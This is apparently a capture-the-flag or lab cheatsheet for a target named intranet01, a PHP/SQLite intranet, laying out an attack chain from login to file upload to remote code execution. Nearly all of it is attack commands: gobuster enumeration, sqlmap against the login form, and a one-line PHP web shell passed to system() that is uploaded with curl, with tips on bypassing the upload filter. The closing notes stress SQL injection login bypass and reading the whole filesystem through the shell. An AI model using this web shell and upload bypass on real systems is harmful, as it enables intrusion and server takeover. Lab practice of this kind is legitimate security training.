# Cheatsheet — The Intranet

## Targets

- **intranet01** — php/sqlite intranet: login → upload → RCE

## Useful commands

```bash
gobuster dir -u http://<ip>/ -w <list> -x php,txt,html
sqlmap -u 'http://<ip>/' --forms --batch           # the login is the first test
curl -s -c c.txt -d 'username=<u>&password=<p>' http://<ip>/

# upload bypass pattern — extension + content-type games
echo '<?php system($_GET["<param>"]); ?>' > <shell>.<ext>
curl -b c.txt -F 'doc=@<shell>.<ext>' http://<ip>/upload.php
```

## Concepts

- Auth bypass via SQLi gives you the *authenticated attack surface*
- Blacklists enumerate what the dev *thought of* — allowlists enumerate what's safe
- www-data shells are still shells: read the whole filesystem with them
